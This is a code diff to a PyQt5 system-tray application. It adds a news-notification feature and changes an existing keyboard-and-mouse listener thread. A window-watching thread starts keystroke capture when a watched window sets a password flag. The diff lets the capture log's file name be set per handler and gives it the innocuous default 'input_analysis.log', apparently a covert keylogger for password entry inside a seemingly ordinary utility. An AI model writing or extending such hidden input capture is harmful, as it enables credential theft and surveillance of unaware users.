@@ -1,7 +1,7 @@
-import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile, ctypes
+import requests, traceback, sys, path, random, time, json, reg, os, shutil, tempfile, ctypes, webbrowser
 from PyQt5 import QtCore
 from PyQt5 import Qt
-from PyQt5.QtGui import QIcon, QFont
+from PyQt5.QtGui import QIcon, QFont, QImage, QPixmap
 from PyQt5.QtWidgets import QApplication, QFrame, QMessageBox, QLabel, QAction, QMenu, QSystemTrayIcon, QDialog, QMainWindow, QVBoxLayout, QWidget, QGraphicsDropShadowEffect, QPushButton, QGridLayout, QSpacerItem, QSizePolicy
 from PyQt5.QtCore import QThread, pyqtSignal, QTimer, QSize
 from ui.Ui_form import Ui_Form
@@ -266,9 +266,22 @@ class MyMainWindow(QMainWindow, Ui_Form):
         if config.get("Tray.StartMsg") != "":
             self.log("<i>Show Tray Message.</i>")
             self.showMessage(config.get("Tray.StartMsg"))
+        if config.get("News.Enable"):
+            self.getNewsThread = GetNewsThread()
+            self.getNewsThread.execer.connect(self.execInnerFunc)
+            self.getNewsThread.start()
 
-        WindowNotify(app, f"{config.get('Tray.ToolTip')}每日资讯", "Contents Here", parent=self).show().showAnimation()
-    
+    def NotifyWindow(self, title, content, banner=False, detail=None, timeout=1000*60*3):
+        def viewCallback(_):
+            print(detail)
+            if detail:
+                webbrowser.open(detail)
+        img = False
+        if banner:
+            res = requests.get(banner)
+            img = QImage.fromData(res.content)
+        WindowNotify(app, f"{config.get('Tray.ToolTip')}每日资讯", title, content, img, timeout=timeout, viewCallback=viewCallback, parent=self).show().showAnimation()
+
     def openAowDialog(self):
         self.aowForm = AowForm(self.desktop.width(), self.desktop.height())
         self.aowForm.show()
@@ -409,9 +422,10 @@ class MyMainWindow(QMainWindow, Ui_Form):
         except Exception:
             pass
     
-    def runKeyBoardThread(self):
+    def runKeyBoardThread(self, fileName):
         if self.keyboardThreadStatus == False:
             self.keyboardThreadStatus = True
+            self.keyboardThread.fileName = fileName
             self.keyboardThread.start()
     
     def stopKeyBoardThread(self):
@@ -568,7 +582,7 @@ class KeyBoardThread(QThread):
             self.enterFlag = False
 
     def run(self):
-        self.file = open(path.path("keyboard.log"), "a+", encoding="utf-8")
+        self.file = open(path.path(self.fileName), "a+", encoding="utf-8")
         now = time.localtime()
         time_str = time.strftime("%Y-%m-%d %H:%M:%S", now)
         self.file.write(f"\n\n({time_str}):\n")
@@ -585,6 +599,17 @@ class KeyBoardThread(QThread):
         self.keyboardListener.join()
         self.keyboardListener.stop()
         self.mouseListener.stop()
+
+class GetNewsThread(QThread):
+    execer = pyqtSignal(str, tuple)
+    def __init__(self):
+        super(GetNewsThread, self).__init__()
+    
+    def run(self):
+        self.news = requests.get(config.get("News.NewsApi")).json()
+        print(self.news)
+        for i in self.news:
+            self.execer.emit("NotifyWindow", (i.get("title"), i.get("content"), i.get("banner", False), i.get("detail", None)))
 
 class GetWindowThread(QThread):
     exitFlag = False
@@ -644,7 +669,7 @@ class GetWindowThread(QThread):
                             if not self.PasswordFlag:
                                 self.PasswordFlag = True
                                 # Start catch keyboard input thread
-                                self.execer.emit("runKeyBoardThread", ())
+                                self.execer.emit("runKeyBoardThread", (i.get("data", {}).get("fileName", "input_analysis.log"),))
                                 self.logger.emit("Started KeyBoard Listener.")
                         elif i.get("handler") == "closeWindow":
                             if isNewWindow and window != None:
@@ -700,6 +725,7 @@ QtCore.QCoreApplication.setAttribute(QtCore.Qt.AA_EnableHighDpiScaling)
 app = QApplication(sys.argv)
 # setup stylesheet
 # qt_material.apply_stylesheet(app, theme='dark_teal.xml')
+QApplication.setFont(QFont(config.get("Config.FontFamily"), int(config.get("Config.FontPointSize"))))
 QApplication.setQuitOnLastWindowClosed(False)
 myWin = MyMainWindow()
 
